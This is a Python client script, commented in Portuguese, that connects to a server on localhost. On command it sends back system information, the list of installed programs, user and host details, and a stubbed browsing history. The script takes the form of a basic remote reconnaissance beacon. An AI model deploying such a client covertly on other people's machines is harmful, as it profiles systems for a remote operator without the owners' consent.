import socket
import os
import platform
import subprocess

# Configuração do cliente
SERVIDOR_HOST, SERVIDOR_PORT = '127.0.0.1', 5000

# Obtém informações do sistema
HOSTNAME = socket.gethostname()
IP_CLIENTE = socket.gethostbyname(HOSTNAME)
USUARIO = os.getlogin()

# Função para obter a lista de programas instalados
def obter_programas_instalados():
    programas = []
    try:
        if platform.system() == "Windows":
            # Comando para listar programas instalados no Windows
            saida = subprocess.check_output(
                'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"',
                shell=True, text=True
            )
            programas = [linha.strip() for linha in saida.split("\n") if linha.strip()]
        else:
            # Comando para listar programas instalados no Linux (exemplo para Debian/Ubuntu)
            saida = subprocess.check_output("dpkg-query -l", shell=True, text=True)
            programas = [linha.split()[1] for linha in saida.split("\n") if linha.startswith("ii")]
    except Exception as e:
        print(f"Erro ao obter programas instalados: {e}")
        programas = ["Erro ao obter programas instalados."]
    return programas

# Função para obter o histórico de navegação
def obter_historico_navegacao():
    # Exemplo simplificado (não funcional em todos os sistemas)
    return [
        "Google",
        "Twitter",
        "Facebook",
        "Instagram",
        "LinkedIn"
    ]

# Função para obter informações do usuário
def obter_informacoes_usuario():
    return [
        f"Usuário: {USUARIO}",
        f"Hostname: {HOSTNAME}",
        f"IP: {IP_CLIENTE}",
        f"Sistema Operacional: {platform.system()} {platform.release()}",
        f"Processador: {platform.processor()}"
    ]

# Função para rodar o cliente em segundo plano
def rodar_cliente():
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Tentando conectar ao servidor...")
    cliente.connect((SERVIDOR_HOST, SERVIDOR_PORT))
    print("Conectado ao servidor.")
    print("Enviando informações do cliente...")
    cliente.send(f"{HOSTNAME}|{IP_CLIENTE}|{USUARIO}".encode())

    while True:
        print("Cliente aguardando comandos do servidor...")
        comando = cliente.recv(1024).decode()
        print(f"Comando recebido: {comando}")

        if comando.lower() == "/info":
            if platform.system() == "Windows":
                saida = subprocess.run(["systeminfo"], capture_output=True, text=True).stdout
                resposta = "\n".join([linha for linha in saida.split("\n") if any(f in linha for f in [
                    "Host", "Sistema operacional", "Versão",
                    "Fabricante", "Tipo", "Processador"
                ])])
            else:
                resposta = os.popen("uname -a").read().strip()
        
        elif comando.lower() == "/status":    
            resposta = "Cliente ativo e respondendo."
        
        elif comando.lower() == "/ping":  # Responde ao ping
            resposta = "pong"
        
        elif comando.lower() == "/programas":
            programas = obter_programas_instalados()
            resposta = "Programas instalados:\n" + "\n".join(programas)
        
        elif comando.lower() == "/historico":
            historico = obter_historico_navegacao()
            resposta = "Histórico de navegação:\n" + "\n".join(historico)
        
        elif comando.lower() == "/usuario":
            info_usuario = obter_informacoes_usuario()
            resposta = "Informações do usuário:\n" + "\n".join(info_usuario)
        
        elif comando.lower() == "/clientes":
            resposta = "Lista de clientes conectados (não implementado)."
        
        else:
            resposta = "Comando não reconhecido."

        cliente.send(str(resposta).encode())


rodar_cliente()